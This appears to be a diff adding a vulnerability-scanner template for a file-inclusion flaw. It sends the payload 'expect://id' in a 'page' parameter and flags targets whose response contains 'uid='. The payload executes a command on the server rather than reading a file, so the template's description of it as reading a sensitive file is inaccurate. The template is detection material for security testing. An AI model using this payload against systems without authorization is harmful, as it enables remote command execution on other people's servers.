@@ -1,0 +1,20 @@
+id: lfi6-0703
+name: 'Traversal in page'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via page'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      page:
+        - 'expect://id'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'uid='
